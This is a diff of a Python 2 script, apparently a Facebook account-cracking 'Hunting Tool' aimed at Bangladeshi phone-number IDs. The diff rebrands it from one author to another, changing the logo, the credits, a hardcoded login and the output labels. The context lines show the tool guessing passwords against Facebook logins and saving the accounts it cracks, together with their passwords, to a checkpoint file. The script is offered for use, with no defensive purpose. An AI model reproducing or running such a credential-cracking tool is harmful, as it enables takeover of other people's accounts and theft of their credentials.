@@ -66,26 +66,30 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo='''
-  _____                             
- |  __ \   Nothing is impossible                    
- | |  | | ___ _ __ ___   ___  _ __  
- | |  | |/ _ \ '_ ` _ \ / _ \| '_ \ 
- | |__| |  __/ | | | | | (_) | | | |
- |_____/ \___|_| |_| |_|\___/|_| |_|
-Hunting Tool (BD 8 Digit)
+ ________         __   ______             __       
+/        |       /  | /      \           /  |      
+$$$$$$$$/______  $$/ /$$$$$$  |  ______  $$ |      
+$$ |__  /      \ /  |$$ \__$$/  /      \ $$ |      
+$$    | $$$$$$  |$$ |$$      \  $$$$$$  |$$ |      
+$$$$$/  /    $$ |$$ | $$$$$$  | /    $$ |$$ |      
+$$ |   /$$$$$$$ |$$ |/  \__$$ |/$$$$$$$ |$$ |_____ 
+$$ |   $$    $$ |$$ |$$    $$/ $$    $$ |$$       |
+$$/     $$$$$$$/ $$/  $$$$$$/   $$$$$$$/ $$$$$$$$/ 
+                                                   
+Hunting Tool (BD 7 Digit)
 --------------------------------------------------
- • Author     : Demon
- • GitHub     : https://GitHub.com/abdullahalemon2
- • Facebook   : fb.com/abdullahalemon2
- • Support    : Jobra King | Imran Vau | Mr.Ha3k3R
+ • Author     : Faisal vai
+ • GitHub     : https://GitHub.com/Faisalvai
+ • Facebook   : https://fb.com/baby.call.me.abbu
+ • Support    : https://GitHub.com/abdullahalemon2
  • Updated On : Feb 5 2021
 --------------------------------------------------
                                 '''
 os.system('clear')
 print (logo)
 #BD 07
-CorrectUsername = "simpleuser9999"
-CorrectPassword = "Demon"
+CorrectUsername = "faisalvai"
+CorrectPassword = "faisalahmmed"
 
 
 loop = 'true'
@@ -124,7 +128,8 @@ def menu():
 			raw_input("\n[ Back ]")
 			menu()
 	xxx = str(len(id))
-        psb ('[✓] Please wait')
+        psb ('[✓] Hello buddy🔥
+        psb ('[✓] Please wait faisal vai getting id')
 	psb ('[✓] Total : ''992961987')
 	time.sleep(0.5)
 	psb ('[✓] Lets Start Hunting')
@@ -153,7 +158,7 @@ def menu():
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '[Login After 10 Days] ' + k + c + user + ' | ' + pass1+'\n'
+					print '[Faisal CP] ' + k + c + user + ' | ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
